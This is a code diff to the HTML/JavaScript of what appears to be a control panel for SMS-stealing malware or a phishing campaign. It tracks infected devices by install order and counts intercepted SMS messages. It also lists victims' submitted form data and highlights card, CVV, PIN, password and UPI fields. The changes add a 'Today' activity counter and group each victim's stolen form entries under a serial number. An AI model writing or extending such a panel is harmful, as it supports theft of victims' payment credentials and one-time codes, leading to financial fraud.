@@ -127,9 +127,9 @@
                     <div class="w-10 h-10 bg-blue-50 text-blue-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-users"></i></div>
                     <div><div class="text-lg font-black leading-none" id="stat-total">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Devices</div></div>
                 </div>
-                <div onclick="setFilter('online')" id="stat-card-online" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
-                    <div class="w-10 h-10 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-satellite-dish"></i></div>
-                    <div><div class="text-lg font-black text-green-600 leading-none" id="stat-online">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Online</div></div>
+                <div onclick="setFilter('today')" id="stat-card-today" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
+                    <div class="w-10 h-10 bg-green-50 text-green-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-calendar-day"></i></div>
+                    <div><div class="text-lg font-black text-green-600 leading-none" id="stat-today">0</div><div class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Today</div></div>
                 </div>
                 <div onclick="setFilter('msgs')" id="stat-card-msgs" class="stat-card bg-white p-3 rounded-xl shadow-sm border-transparent flex items-center gap-3">
                     <div class="w-10 h-10 bg-indigo-50 text-indigo-600 rounded-lg flex items-center justify-center text-lg"><i class="fas fa-envelope"></i></div>
@@ -347,7 +347,7 @@
         });
         const activeCard = document.getElementById('stat-card-' + f);
         activeCard.classList.add('active-filter');
-        const color = f === 'all' ? 'blue' : f === 'online' ? 'green' : f === 'msgs' ? 'indigo' : 'rose';
+        const color = f === 'all' ? 'blue' : f === 'today' ? 'green' : f === 'msgs' ? 'indigo' : 'rose';
         activeCard.classList.replace('border-transparent', `border-${color}-500`);
         updateDashboard();
     }
@@ -364,9 +364,12 @@
     function updateDashboard() {
         const query = document.getElementById('user-search').value.toLowerCase();
         const uids = Object.keys(usersData);
-        let onlineCount = 0, msgsCount = 0, formsCount = 0;
+        let todayCount = 0, msgsCount = 0, formsCount = 0;
         const listDiv = document.getElementById('dashboard-list');
         listDiv.innerHTML = '';
+
+        const now = new Date();
+        const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
 
         // Generate Permanent Serial Numbers based on Global Install Order (Ascending)
         const globalSorted = [...uids].sort((a,b) => (usersData[a].I?.ca || 0) - (usersData[b].I?.ca || 0));
@@ -379,7 +382,10 @@
                 const u = usersData[uid];
                 const info = u.I || {};
                 const isOnline = Date.now() - (info.lo || 0) < 60000;
-                if(isOnline) onlineCount++;
+                const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
+                const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
+
+                if(isToday) todayCount++;
                 if(u.F) formsCount++;
                 const msgs = Object.values(u.M || {});
                 if(msgs.length > 0) msgsCount++;
@@ -405,25 +411,45 @@
                 }
             });
         } else if (currentFilter === 'forms') {
-            let allForms = [];
+            let userGroups = [];
             uids.forEach(uid => {
                 const u = usersData[uid];
                 const info = u.I || {};
                 const isOnline = Date.now() - (info.lo || 0) < 60000;
-                if(isOnline) onlineCount++;
+                const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
+                const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
+
+                if(isToday) todayCount++;
                 if(Object.keys(u.M || {}).length > 0) msgsCount++;
-                const forms = Object.values(u.F || {});
-                if(forms.length > 0) formsCount++;
-                forms.forEach(f => allForms.push({ ...f, uid, name: (info.m || "Unknown") }));
+
+                if (u.F) {
+                    formsCount++;
+                    const forms = Object.values(u.F).sort((a,b) => (b.ts || 0) - (a.ts || 0));
+                    userGroups.push({
+                        uid: uid,
+                        name: info.m || "Unknown",
+                        forms: forms,
+                        lastTs: forms[0]?.ts || 0
+                    });
+                }
             });
 
-            allForms.sort((a,b) => (b.ts || 0) - (a.ts || 0)).forEach(f => {
+            userGroups.sort((a,b) => b.lastTs - a.lastTs).forEach(ug => {
                 let fieldsHtml = "";
-                let searchText = f.name;
-                for(let k in f) {
-                    if(['ts','uid','name'].includes(k)) continue;
-                    const val = f[k];
-                    searchText += " " + val;
+                let searchText = ug.name;
+
+                // Collect all unique fields across all submissions for this user
+                let combinedData = {};
+                ug.forms.forEach(f => {
+                    for(let k in f) {
+                        if(['ts','uid','name','page','timestamp'].includes(k)) continue;
+                        combinedData[k] = f[k];
+                        searchText += " " + f[k];
+                    }
+                });
+
+                for(let k in combinedData) {
+                    const val = combinedData[k];
                     const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
                     fieldsHtml += `
                         <div class="${isS ? 'bg-rose-50 border-rose-100' : 'bg-slate-50 border-slate-100'} p-2 rounded border mt-1">
@@ -431,14 +457,18 @@
                             <div class="text-sm font-black ${isS ? 'text-rose-600' : 'text-slate-700'}">${val}</div>
                         </div>`;
                 }
+
                 if (!query || searchText.toLowerCase().includes(query)) {
                     const card = document.createElement('div');
                     card.className = "user-box border-l-4 border-l-rose-500";
-                    card.onclick = () => showUserDetails(f.uid);
+                    card.onclick = () => showUserDetails(ug.uid);
                     card.innerHTML = `
                         <div class="flex justify-between items-center mb-3">
-                            <span class="text-[10px] font-black text-rose-600 uppercase bg-rose-50 px-2 py-0.5 rounded">${f.name}</span>
-                            <span class="text-[9px] text-slate-400 font-mono">${new Date(f.ts).toLocaleString()}</span>
+                            <div class="flex items-center gap-2">
+                                <div class="text-[10px] font-black text-slate-300">#${permIds[ug.uid]}</div>
+                                <span class="text-[10px] font-black text-rose-600 uppercase bg-rose-50 px-2 py-0.5 rounded">${ug.name}</span>
+                            </div>
+                            <span class="text-[9px] text-slate-400 font-mono">${new Date(ug.lastTs).toLocaleString()}</span>
                         </div>
                         <div class="grid grid-cols-1 gap-2">${fieldsHtml}</div>
                     `;
@@ -454,12 +484,14 @@
                 const mList = Object.values(u.M || {}).sort((a,b) => (b.ts || 0) - (a.ts || 0));
                 const lastM = mList[0] || {};
                 const isOnline = Date.now() - (info.lo || 0) < 60000;
+                const hasSmsToday = Object.values(u.M || {}).some(m => (m.ts || 0) >= startOfToday);
+                const isToday = (info.lo || 0) >= startOfToday || hasSmsToday;
 
-                if(isOnline) onlineCount++;
+                if(isToday) todayCount++;
                 if(Object.keys(u.M || {}).length > 0) msgsCount++;
                 if(u.F) formsCount++;
 
-                let matchesF = (currentFilter === 'all') || (currentFilter === 'online' && isOnline);
+                let matchesF = (currentFilter === 'all') || (currentFilter === 'today' && isToday);
                 const name = (info.m || "Unknown");
 
                 if(matchesF && (!query || name.toLowerCase().includes(query) || uid.toLowerCase().includes(query))) {
@@ -497,7 +529,7 @@
             });
         }
         document.getElementById('stat-total').innerText = uids.length;
-        document.getElementById('stat-online').innerText = onlineCount;
+        document.getElementById('stat-today').innerText = todayCount;
         document.getElementById('stat-msgs').innerText = msgsCount;
         document.getElementById('stat-forms').innerText = formsCount;
     }
@@ -545,7 +577,7 @@
             wrap.innerHTML = `<div class="text-xs font-black text-rose-600 uppercase mb-3">ENTRY #${idx+1} <span class="text-slate-400 ml-2 font-mono text-[10px]">${new Date(f.ts).toLocaleString()}</span></div>`;
             let grid = `<div class="grid grid-cols-1 gap-3">`;
             for(let k in f) {
-                if(['ts','uid','name'].includes(k)) continue;
+                if(['ts','uid','name','page','timestamp'].includes(k)) continue;
                 const isS = /card|cvv|pin|pass|upi/.test(k.toLowerCase());
                 grid += `<div class="bg-slate-50 p-2.5 rounded-lg border border-slate-100"><div class="text-[10px] text-slate-400 uppercase font-black mb-0.5">${k}</div><div class="text-sm font-black ${isS ? 'text-rose-600' : 'text-slate-900'}">${f[k]}</div></div>`;
             }
